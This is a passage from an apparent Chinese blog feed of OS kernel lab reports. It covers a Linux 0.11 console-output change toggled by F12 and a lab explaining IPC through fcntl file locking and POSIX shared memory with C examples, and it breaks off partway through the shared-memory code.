class="string">"a"</span> (c),<span class="string">"m"</span> (*(short *)pos)</span><br><span class="line">                        );</span><br><span class="line">                    pos += <span class="number">2</span>;</span><br><span class="line">                    x++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">27</span>)</span><br><span class="line">                    state=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">10</span> || c==<span class="number">11</span> || c==<span class="number">12</span>)</span><br><span class="line">                    lf();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">13</span>)</span><br><span class="line">                    cr();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==ERASE_CHAR(tty))</span><br><span class="line">                    del();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (x) &#123;</span><br><span class="line">                        x--;</span><br><span class="line">                        pos -= <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">9</span>) &#123;</span><br><span class="line">                    c=<span class="number">8</span>-(x&amp;<span class="number">7</span>);</span><br><span class="line">                    x += c;</span><br><span class="line">                    pos += c&lt;&lt;<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span> (x&gt;video_num_columns) &#123;</span><br><span class="line">                        x -= video_num_columns;</span><br><span class="line">                        pos -= video_size_row;</span><br><span class="line">                        lf();</span><br><span class="line">                    &#125;</span><br><span class="line">                    c=<span class="number">9</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">7</span>)</span><br><span class="line">                    sysbeep();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                state=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (c==<span class="string">'['</span>)</span><br><span class="line">                    state=<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="string">'E'</span>)</span><br><span class="line">                    gotoxy(<span class="number">0</span>,y+<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="string">'M'</span>)</span><br><span class="line">                    ri();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="string">'D'</span>)</span><br><span class="line">                    lf();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="string">'Z'</span>)</span><br><span class="line">                    respond(tty);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (x==<span class="string">'7'</span>)</span><br><span class="line">                    save_cur();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (x==<span class="string">'8'</span>)</span><br><span class="line">                    restore_cur();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">for</span>(npar=<span class="number">0</span>;npar&lt;NPAR;npar++)</span><br><span class="line">                    par[npar]=<span class="number">0</span>;</span><br><span class="line">                npar=<span class="number">0</span>;</span><br><span class="line">                state=<span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span> ((ques=(c==<span class="string">'?'</span>)))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">if</span> (c==<span class="string">';'</span> &amp;&amp; npar&lt;NPAR<span class="number">-1</span>) &#123;</span><br><span class="line">                    npar++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c&gt;=<span class="string">'0'</span> &amp;&amp; c&lt;=<span class="string">'9'</span>) &#123;</span><br><span class="line">                    par[npar]=<span class="number">10</span>*par[npar]+c-<span class="string">'0'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> state=<span class="number">4</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                state=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">switch</span>(c) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'G'</span>: <span class="keyword">case</span> <span class="string">'`'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>]) par[<span class="number">0</span>]--;</span><br><span class="line">                        gotoxy(par[<span class="number">0</span>],y);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(x,y-par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'B'</span>: <span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(x,y+par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'C'</span>: <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(x+par[<span class="number">0</span>],y);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(x-par[<span class="number">0</span>],y);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(<span class="number">0</span>,y+par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(<span class="number">0</span>,y-par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>]) par[<span class="number">0</span>]--;</span><br><span class="line">                        gotoxy(x,par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'H'</span>: <span class="keyword">case</span> <span class="string">'f'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>]) par[<span class="number">0</span>]--;</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">1</span>]) par[<span class="number">1</span>]--;</span><br><span class="line">                        gotoxy(par[<span class="number">1</span>],par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'J'</span>:</span><br><span class="line">                        csi_J(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'K'</span>:</span><br><span class="line">                        csi_K(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">                        csi_L(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">                        csi_M(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'P'</span>:</span><br><span class="line">                        csi_P(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'@'</span>:</span><br><span class="line">                        csi_at(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'m'</span>:</span><br><span class="line">                        csi_m();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'r'</span>:</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>]) par[<span class="number">0</span>]--;</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">1</span>]) par[<span class="number">1</span>] = video_num_lines;</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>] &lt; par[<span class="number">1</span>] &amp;&amp;</span><br><span class="line">                            par[<span class="number">1</span>] &lt;= video_num_lines) &#123;</span><br><span class="line">                            top=par[<span class="number">0</span>];</span><br><span class="line">                            bottom=par[<span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                        save_cur();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'u'</span>:</span><br><span class="line">                        restore_cur();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    set_cursor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="将更改后的文件重新编译"><a href="#将更改后的文件重新编译" class="headerlink" title="将更改后的文件重新编译"></a>将更改后的文件重新编译</h2><ol><li><p>首先输入命令<code>make clean</code>清空编译；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125234719.png" alt=""></p></li><li><p>输入命令<code>make</code>和<code>make start</code>进行编译并运行；</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125234858493.png" alt="image-20191125234858493"></p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125235053453.png" alt="image-20191125235053453"></p></li><li><p>输入命令<code>ls</code>，发现输出正常；</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125235327605.png" alt="image-20191125235327605"></p></li><li><p>按下F12，输出四个进程；</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125235516207.png" alt="image-20191125235516207"></p></li><li><p>继续输入<code>ls</code>，输出全是<code>*</code>；</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125235710080.png" alt="image-20191125235710080"></p></li><li><p>按下F12，输出得全是<code>*</code>；继续输入<code>ls</code>，输出正常。继续测试，按下F12，依次切换<code>*</code>，和正常输出，实验完成。</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191126000059618.png" alt="image-20191126000059618"></p></li></ol><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> 操作系统内核实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 输入输出管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统内核 实验五</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%BA%94.html"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%BA%94.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>了解进程如何让在 Linux 中彼此同步；</li><li>理解 C 语言代码所阐述的文件共享、内存共享、管道通信、信号量互斥、队列通信等 IPC 机制；</li><li>运行实验代码理解代码执行过程；</li><li>实现内核和用户程序之间的文件通信； </li></ol><a id="more"></a><h1 id="实验基本概念"><a href="#实验基本概念" class="headerlink" title="实验基本概念"></a>实验基本概念</h1><ol><li>进程是运行着的程序，每个进程都有着它自己的地址空间，这些空间由进程被允许访问的内存地址组成。进程有一个或多个执行线程，而线程是一系列执行指令的集合：单线程进程就只有一个线程，而多线程的进程则有多个线程。一个进程中的线程共享各种资源，特别是地址空间。另外，一个进程中的线程可以直接通过共享内存来进行通信。</li><li>有多种方法启动之后要进行通信的进程，但主要有两种方式：一种是一个终端被用来启动一个进程，另一个不同的终端被用来启动另一个；另一种是在一个进程（父进程）中调用系统函数 fork，以此启动另一个进程（子进程）。</li></ol><h1 id="理解实验原理和代码"><a href="#理解实验原理和代码" class="headerlink" title="理解实验原理和代码"></a>理解实验原理和代码</h1><h2 id="文件共享-producer-consumer"><a href="#文件共享-producer-consumer" class="headerlink" title="文件共享 ./producer ./consumer"></a>文件共享 <code>./producer ./consumer</code></h2><ol><li><p>文件共享是最基础的进程间通信<code>IPC</code>机制。实验所给的代码中考虑了一个相对简单的例子，其中一个进程(生产者producer)创建和写入一个文件，然后另一个进程(消费者consumer)从这个相同的文件中进行读取。在使用这个IPC机制时，生产者和消费者可能恰好在同一时间访问该文<br>件，从而使得输出结果不确定。为了避免竞争条件的发生，该文件在处于读或写状态时必须以某种方式处于被锁状态，从而阻止在写操作执行时和其他操作的冲突。</p></li><li><p><strong>解决办法</strong>：生产者在写入文件时获得一个文件的排斥锁。一个排斥锁最多被一个进程所拥有。这样就可以排除掉竞争条件的发生，因为在锁被释放之前没有其他的进程可以访问这个文件； 消费者在从文件中读取内容时得到至少一个共享锁。多个读取者可以同时保有一个共享锁，但是没有写入者可以获取到文件内容，甚至在当只有一个读取者保有一个共享锁时。标准的 I/O 库中包含了一个名为 fcntl 的实用函数，它可以被用来检查或者操作一个文件上的排斥锁和共享锁。 </p></li><li><p><code>producer.c</code>程序分析：首先声明了一个类型为<code>struct flock</code>的变量，它代表一个锁，对 <code>l_type</code>的初始化，使得这个锁是排斥锁而不是一个共享锁，假如生产者获得该锁，则其他进程不能对文件进行读写操作，直到生产者释放该锁或者显式地调用<code>fcntl</code>，又或者隐式地关闭这个文件。当进程终止时，所有被它打开的文件都会被自动关闭，从而释放了锁。接着初始化其他的域。主要的效果是整个文件都将被锁上。然后调用<code>fcntl</code>尝试排斥性地将文件锁住，并检查调用是否成功。如果生产者获得了锁，则程序向文件中写入<code>DataString</code>，然后改变锁的结构为<code>F_UNLCK</code>，调用<code>fcntl</code>执行解锁操作，最后关闭文件并退出。 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FileName <span class="meta-string">"data.dat"</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">report_and_exit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* EXIT_FAILURE */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">flock</span> <span class="title">lock</span>;</span></span><br><span class="line">  lock.l_type = F_WRLCK;   <span class="comment">//读/写(独占对共享)锁</span></span><br><span class="line">  lock.l_whence = SEEK_SET;<span class="comment">//寻求偏移基址</span></span><br><span class="line">  lock.l_start = <span class="number">0</span>;        <span class="comment">//文件中的第1字节</span></span><br><span class="line">  lock.l_len = <span class="number">0</span>;          <span class="comment">//0意味着'until EOF'</span></span><br><span class="line">  lock.l_pid = getpid();   <span class="comment">//进程id</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">//文件描述符，用于标识进程中的文件</span></span><br><span class="line">  <span class="keyword">if</span> ((fd = <span class="built_in">open</span>(FileName, O_RDWR | O_CREAT, <span class="number">0666</span>)) &lt; <span class="number">0</span>)  <span class="comment">//-1标志着错误</span></span><br><span class="line">    report_and_exit(<span class="string">"open failed..."</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>) <span class="comment">//F_SETLK 没有阻塞, F_SETLKW 阻塞</span></span><br><span class="line">    report_and_exit(<span class="string">"fcntl failed to get lock..."</span>);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">write</span>(fd, DataString, <span class="built_in">strlen</span>(DataString)); <span class="comment">//填充数据文件</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Process %d has written to data file...\n"</span>, lock.l_pid);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 开始释放锁 */</span></span><br><span class="line">  lock.l_type = F_UNLCK;</span><br><span class="line">  <span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>)</span><br><span class="line">    report_and_exit(<span class="string">"explicit unlocking failed..."</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">close</span>(fd); <span class="comment">//关闭文件，如果需要将会解锁</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//终止进程也会解锁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>consumer.c</code>程序分析：程序首先要检查一下文件是否被排斥性锁锁住了，即是否有生产者在写文件，然后才尝试去获取一个共享锁<code>F_RDLCK</code>。调用一个只读锁能够阻止其他进程向文件进行写的操作，但可以允许其他进程对文件进行读取，即共享锁可以被多个进程所保有。在获取了一个共享锁后，消费者程序将立即从文件中读取字节数据，然后在标准输出中打印这些字节的内容，接着释放锁，关闭文件并终止。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FileName <span class="meta-string">"data.dat"</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">report_and_exit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* EXIT_FAILURE */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">flock</span> <span class="title">lock</span>;</span></span><br><span class="line">  lock.l_type = F_WRLCK;   <span class="comment">//读/写(独占对共享)锁</span></span><br><span class="line">  lock.l_whence = SEEK_SET;<span class="comment">//寻求偏移基址</span></span><br><span class="line">  lock.l_start = <span class="number">0</span>;        <span class="comment">//文件中的第1字节</span></span><br><span class="line">  lock.l_len = <span class="number">0</span>;          <span class="comment">//0意味着'until EOF'</span></span><br><span class="line">  lock.l_pid = getpid();   <span class="comment">//进程id</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">//文件描述符，用于标识进程中的文件</span></span><br><span class="line">  <span class="keyword">if</span> ((fd = <span class="built_in">open</span>(FileName, O_RDONLY)) &lt; <span class="number">0</span>)  <span class="comment">//-1标志着错误</span></span><br><span class="line">    report_and_exit(<span class="string">"open to read failed..."</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果文件被写锁定，将无法继续 */</span></span><br><span class="line">  fcntl(fd, F_GETLK, &amp;lock); <span class="comment">//如果没有写锁，将lock.l_type设置为F_UNLCK</span></span><br><span class="line">  <span class="keyword">if</span> (lock.l_type != F_UNLCK)</span><br><span class="line">    report_and_exit(<span class="string">"file is still write locked..."</span>);</span><br><span class="line"></span><br><span class="line">  lock.l_type = F_RDLCK; <span class="comment">//在阅读过程中防止任何写</span></span><br><span class="line">  <span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>)</span><br><span class="line">    report_and_exit(<span class="string">"can't get a read-only lock..."</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 一次读取一个字节(恰好是ASCII码) */</span></span><br><span class="line">  <span class="keyword">int</span> c; <span class="comment">//读字节缓冲区</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">read</span>(fd, &amp;c, <span class="number">1</span>) &gt; <span class="number">0</span>)    <span class="comment">//0标志着EOF</span></span><br><span class="line">   <span class="built_in">write</span>(STDOUT_FILENO, &amp;c, <span class="number">1</span>); <span class="comment">//向标准输出写入一个字节</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 开始释放锁 */</span></span><br><span class="line">  lock.l_type = F_UNLCK;</span><br><span class="line">  <span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>)</span><br><span class="line">    report_and_exit(<span class="string">"explicit unlocking failed..."</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">close</span>(fd); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="内存共享-memwriter-memreader"><a href="#内存共享-memwriter-memreader" class="headerlink" title="内存共享 ./memwriter ./memreader"></a>内存共享 <code>./memwriter ./memreader</code></h2><ol><li><p>对于内存共享，Linux系统提供了两类不同的API：传统的<code>System V API</code>和较为新颖的<code>POSIX API</code>。在单个应用中，这些API不能混用。但是，<code>POSIX</code>方式的一个坏处是它的特性仍在发展中，并且依赖于安装的内核版本，这非常影响代码的可移植性。例如，默认情况下，POSIX API 用内存映射文件来实现共享内存：对于一个共享的内存段，系统为相应的内容维护一个备份文<br>件。在<code>POSIX</code>规范下共享内存可以被配置为不需要备份文件，但这可能会影响可移植性。实验课代码中使用的是带有备份文件的<code>POSIX API</code>，这既结合了内存获取的速度优势，又获得了文件存储的持久性。</p></li><li><p>内存共享中的两个程序<code>memewrite</code>和<code>memreader</code>使用的信号量来同步对内存的访问。一般的信号量也被叫做一个计数信号量，因为带有一个可以增加的值(通常初始化为 0)。考虑一家租用自行车的商店，在它的库存中有 100 辆自行车，还有一个供职员用于租赁的程序。每当一辆自行车被租出去，信号量就增加 1；当一辆自行车被还回来，信号量就减 1。在信号量的值为 100 之前都还可以进行租赁业务，但如果等于 100 时，就必须停止业务，直到至少有一辆自行车被还回来，从而信号量减为 99。二元信号量只有两个值：0 和1，信号量的表现为互斥，即信号量为 0 的时候，只有<code>memwriter</code>可以获取共享内存，在进行写操作完成后，这个进程将增加信号量的值使其为 1，从而允许<code>memreader</code> 来读取共享内存。</p></li><li><p><code>memwrite.c</code>程序分析：程序调用<code>shm_open</code>函数来得到作为系统协调共享内存的备份文件描述符，此时还没有内存被分配。然后调用<code>ftruncate</code>函数分配<code>ByteSize</code>字节的内存。接着<code>memwrite</code>调用<code>mmap</code>函数来获取共享内存的指针。其中调用的是<code>calloc</code>动态分配内存时将其初始化为 0。目前，<code>memwrite</code>已经准备好进行写操作了，但是它要调用<code>sem_open</code>创建一个信号量来确保共享内存的互斥性，写操作完成后再调用 <code>sem_post</code> 函数将信号量的值增加到 1，释放互斥锁，使得<code>memreader</code>可以执行它的读操作。<code>memwriter</code>也将从它自己的地址空间中取消映射，使得<code>memwriter</code>不能进一步地访问共享内存。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;          </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"shmem.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">report_and_exit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span 